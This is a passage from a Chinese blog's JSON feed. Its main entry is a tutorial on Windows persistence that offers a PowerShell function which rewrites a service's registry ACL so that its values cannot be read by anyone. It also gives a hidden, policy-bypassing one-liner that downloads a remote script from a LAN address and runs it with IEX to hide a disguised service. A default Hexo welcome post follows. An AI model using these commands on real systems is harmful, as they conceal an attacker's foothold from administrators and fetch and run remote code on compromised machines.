data-src=\"https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973156783-c89ae77b-148f-4bcd-9970-b9351192a402.png#averageHue=%23fbfbfa&amp;clientId=ua1aa948f-0eae-4&amp;from=paste&amp;height=289&amp;id=ubc5fdbca&amp;originHeight=289&amp;originWidth=928&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=76377&amp;status=done&amp;style=none&amp;taskId=u36ac8e23-c73c-4683-8a7f-e87128fbc25&amp;title=&amp;width=928\" alt=\"image.png\" /></p>\n<h2 id=\"6-修改注册表acl\"><a class=\"anchor\" href=\"#6-修改注册表acl\">#</a> 6. 修改注册表 ACL</h2>\n<p><strong>我们可以通过修改注册表的 DACL 来拒绝对值的查询，达到隐藏异常值的效果。</strong><br />\n** 这里给出一个通过 powershell 修改注册表项的访问权限的简单脚本：   **</p>\n<p><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Server-Sddl-Change</span></span>&#123;</span><br><span class=\"line\">[<span class=\"type\">CmdletBinding</span>()]</span><br><span class=\"line\"><span class=\"keyword\">param</span></span><br><span class=\"line\">(</span><br><span class=\"line\">[<span class=\"type\">parameter</span>(<span class=\"type\">Mandatory</span>=<span class=\"variable\">$false</span>)][<span class=\"built_in\">String</span>]<span class=\"variable\">$Name</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"variable\">$ROOT</span> = <span class=\"string\">&quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$S</span> = <span class=\"variable\">$ROOT</span>+<span class=\"variable\">$NAME</span></span><br><span class=\"line\"><span class=\"variable\">$acl</span> = <span class=\"built_in\">Get-Acl</span> <span class=\"variable\">$S</span></span><br><span class=\"line\"><span class=\"variable\">$acl</span>.SetAccessRuleProtection(<span class=\"variable\">$true</span>, <span class=\"variable\">$false</span>)</span><br><span class=\"line\"><span class=\"variable\">$person</span> = [<span class=\"type\">System.Security.Principal.NTAccount</span>]<span class=\"string\">&quot;Everyone&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$access</span> = [<span class=\"type\">System.Security.AccessControl.RegistryRights</span>]<span class=\"string\">&quot;QueryValues&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$inheritance</span> = [<span class=\"type\">System.Security.AccessControl.InheritanceFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$propagation</span> = [<span class=\"type\">System.Security.AccessControl.PropagationFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$type</span> = [<span class=\"type\">System.Security.AccessControl.AccessControlType</span>]<span class=\"string\">&quot;Deny&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$rule</span> = <span class=\"built_in\">New-Object</span> System.Security.AccessControl.RegistryAccessRule( `</span><br><span class=\"line\"><span class=\"variable\">$person</span>,<span class=\"variable\">$access</span>,<span class=\"variable\">$inheritance</span>,<span class=\"variable\">$propagation</span>,<span class=\"variable\">$type</span>)</span><br><span class=\"line\"><span class=\"variable\">$acl</span>.AddAccessRule(<span class=\"variable\">$rule</span>)</span><br><span class=\"line\"><span class=\"variable\">$person</span> = [<span class=\"type\">System.Security.Principal.NTAccount</span>]<span class=\"string\">&quot;Everyone&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$access</span> =</span><br><span class=\"line\">[<span class=\"type\">System.Security.AccessControl.RegistryRights</span>]<span class=\"string\">&quot;SetValue,CreateSubKey,EnumerateSu</span></span><br><span class=\"line\"><span class=\"string\">bKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,Chang</span></span><br><span class=\"line\"><span class=\"string\">ePermissions,TakeOwnership&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$inheritance</span> = [<span class=\"type\">System.Security.AccessControl.InheritanceFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$propagation</span> = [<span class=\"type\">System.Security.AccessControl.PropagationFlags</span>]<span class=\"string\">&quot;None&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$type</span> = [<span class=\"type\">System.Security.AccessControl.AccessControlType</span>]<span class=\"string\">&quot;Allow&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$rule</span> = <span class=\"built_in\">New-Object</span> System.Security.AccessControl.RegistryAccessRule( `</span><br><span class=\"line\"><span class=\"variable\">$person</span>,<span class=\"variable\">$access</span>,<span class=\"variable\">$inheritance</span>,<span class=\"variable\">$propagation</span>,<span class=\"variable\">$type</span>)</span><br><span class=\"line\"><span class=\"variable\">$acl</span>.AddAccessRule(<span class=\"variable\">$rule</span>)</span><br><span class=\"line\"><span class=\"built_in\">Set-Acl</span> <span class=\"variable\">$S</span> <span class=\"variable\">$acl</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"7-远程加载powershell脚本\"><a class=\"anchor\" href=\"#7-远程加载powershell脚本\">#</a> 7. 远程加载 powershell 脚本：</h2>\n<p><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell.exe <span class=\"literal\">-exec</span> bypass <span class=\"literal\">-nop</span> <span class=\"literal\">-w</span> <span class=\"keyword\">hidden</span> <span class=\"literal\">-c</span> <span class=\"string\">&quot;IEX((new-object</span></span><br><span class=\"line\"><span class=\"string\">net.webclient).downloadstring(&#x27;http://192.168.0.149/1.ps1&#x27;));Server-Sddl-Change -</span></span><br><span class=\"line\"><span class=\"string\">Name &#x27;.NET CLR Networking 3.5.0.0&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\"><a class=\"anchor\" href=\"#8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\">#</a> 8. .NET CLR Networking 3.5.0.0 改成你的服务名 从下图可见已将值从该服务项中隐藏：</h2>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973492501-06b273bb-dd0f-4db0-bc84-0af6838061a7.png#averageHue=%23fbfaf9&amp;clientId=ua1aa948f-0eae-4&amp;from=paste&amp;height=259&amp;id=ua87b4a87&amp;originHeight=259&amp;originWidth=926&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=61070&amp;status=done&amp;style=none&amp;taskId=u375f7037-0514-4820-aa72-7d5fd3ea1d0&amp;title=&amp;width=926\" alt=\"image.png\" /></p>\n",
            "tags": [
                "权限维持"
            ]
        },
        {
            "id": "http://example.com/2024/01/22/life/hello-world/",
            "url": "http://example.com/2024/01/22/life/hello-world/",
            "title": "你好",
            "date_published": "2024-01-21T16:30:34.000Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure></p>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure></p>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure></p>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": [
                "我的博客"
            ]
        }
    ]
}